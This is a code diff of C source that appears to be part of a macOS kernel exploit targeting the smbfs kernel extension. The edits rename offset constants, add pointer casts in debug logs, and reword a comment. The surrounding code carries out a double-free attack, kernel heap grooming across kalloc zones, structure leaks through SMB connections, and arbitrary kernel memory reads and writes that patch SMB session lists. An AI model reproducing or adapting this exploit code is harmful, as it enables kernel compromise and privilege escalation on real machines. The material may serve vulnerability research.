@@ -111,28 +111,28 @@ void patch_smb_iod(xe_slider_kext_t smbfs_slider, uintptr_t iod) {
 
 
 void patch_session_interface_table(xe_slider_kext_t smbfs_slider, uintptr_t table) {
-    xe_kmem_write_uint32(table, XE_SMB_TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_COUNT_OFFSET, 0);
-    xe_kmem_write_uint64(table, XE_SMB_TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_INFO_LIST_OFFSET, 0);
+    xe_kmem_write_uint32(table, TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_COUNT_OFFSET, 0);
+    xe_kmem_write_uint64(table, TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_INFO_LIST_OFFSET, 0);
 }
 
 
 void patch_smb_session(xe_slider_kext_t smbfs_slider, uintptr_t session) {
-    uintptr_t iod = xe_kmem_read_uint64(session, XE_SMB_TYPE_SMB_SESSION_MEM_SESSION_IOD_OFFSET);
+    uintptr_t iod = xe_kmem_read_uint64(session, TYPE_SMB_SESSION_MEM_SESSION_IOD_OFFSET);
     if (iod) {
         patch_smb_iod(smbfs_slider, iod);
     }
-    uintptr_t session_interface_table = session + XE_SMB_TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET;
+    uintptr_t session_interface_table = session + TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET;
     patch_session_interface_table(smbfs_slider, session_interface_table);
 }
 
 
 void patch_smb_sessions(xe_slider_kext_t smbfs_slider) {
-    uintptr_t smb_session_list = xe_slider_kext_slide(smbfs_slider, XE_KEXT_SEGMENT_DATA, XE_SMB_VAR_SMB_SESSION_LIST_OFFSET_DATA);
-    uintptr_t cursor = xe_kmem_read_uint64(smb_session_list, XE_SMB_TYPE_SMB_CONNOBJ_MEM_CO_CHILDREN_OFFSET);
+    uintptr_t smb_session_list = xe_slider_kext_slide(smbfs_slider, XE_KEXT_SEGMENT_DATA, VAR_SMB_SESSION_LIST_OFFSET_DATA);
+    uintptr_t cursor = xe_kmem_read_uint64(smb_session_list, TYPE_SMB_CONNOBJ_MEM_CO_CHILDREN_OFFSET);
     while (cursor != 0) {
         xe_assert(XE_VM_KERNEL_ADDRESS_VALID(cursor));
         patch_smb_session(smbfs_slider, cursor);
-        cursor = xe_kmem_read_uint64(cursor, XE_SMB_TYPE_SMB_CONNOBJ_MEM_CO_NEXT_OFFSET);
+        cursor = xe_kmem_read_uint64(cursor, TYPE_SMB_CONNOBJ_MEM_CO_NEXT_OFFSET);
     }
 }
 
@@ -174,7 +174,7 @@ int main(void) {
     /// During tailq initialization, the value of field `tqh_last` is set as address of field `tqh_first`. This can be used
     /// for calculating address of leaked `struct complete_nic_info_entry`
     uintptr_t double_free_nic_address = ((uintptr_t)double_free_nic.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections));
-    xe_log_debug("leaked struct complete_nic_info_entry at %p with nic_index %llu for double free", double_free_nic_address, double_free_nic.nic_index);
+    xe_log_debug("leaked struct complete_nic_info_entry at %p with nic_index %llu for double free", (void*)double_free_nic_address, double_free_nic.nic_index);
     
     // STEP 1-b: Allocate an element in kext.kalloc.256 zone which can be used as
     //           a valid successor of tailq element `struct complete_nic_info_entry`
@@ -262,8 +262,8 @@ int main(void) {
         struct sockaddr_in addr = smb_addr;
         /// The xe_smbx server listens on a total of `XE_SMBX_PORT_COUNT` ports. Distributing the `struct nbpcb` allocations
         /// over these ports allows us to group them to `XE_SMBX_PORT_COUNT` groups. When an `struct nbpcb` is leaked,
-        /// the port used during its allocation can be found. This can be used for finding the group to which the leaked `struct nbpcb`
-        /// belongs. This grouping is useful in step 3-d
+        /// the port used for its allocation can be found from `nbpcb->nbp_sock_addr`. This can be used for finding the group to
+        /// which the leaked `struct nbpcb` belongs. This grouping is useful in step 3-d
         addr.sin_port = htons(SMB_PORT_FOR_INDEX(&smb_addr, index, num_nbpcb_capture_allocations));
         int error = smb_client_ioc_negotiate(nbpcb_capture_allocators[index], &addr, sizeof(addr), FALSE);
         if (error) {
@@ -325,7 +325,7 @@ int main(void) {
     /// During tailq initialization, the value of field `tqh_last` is set as address of field `tqh_first`. This can be used
     /// for calculating address of leaked `struct complete_nic_info_entry`
     double_free_nic_address = ((uintptr_t)double_free_nic.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections));
-    xe_log_debug("leaked struct complete_nic_info_entry at %p with nic_index %llu for double free", double_free_nic_address, double_free_nic.nic_index);
+    xe_log_debug("leaked struct complete_nic_info_entry at %p with nic_index %llu for double free",(void*)double_free_nic_address, double_free_nic.nic_index);
     
     // STEP 3-b: Construct data for a kext.kalloc.768 zone element which can be used as
     //           a valid successor of tailq element `struct complete_nic_info_entry`
